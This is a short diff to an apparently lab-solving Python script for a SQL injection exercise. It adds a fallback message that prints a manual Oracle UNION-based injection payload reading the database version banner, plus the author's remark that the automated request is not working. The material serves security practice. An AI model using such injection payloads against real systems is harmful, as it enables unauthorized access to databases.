@@ -34,6 +34,9 @@ def exp():
     s = r.get(url + payload, verify=False)
     if "Congratulations" in s.text:
         print("Lab solved!")
+    else:
+        print("You can use this payload for manual: ' UNION SELECT BANNER, NULL FROM v$version--")
+        print("I don't know why it's not working. Even though i already using request sessions.")
 
 if __name__ == "__main__":
     union_select()
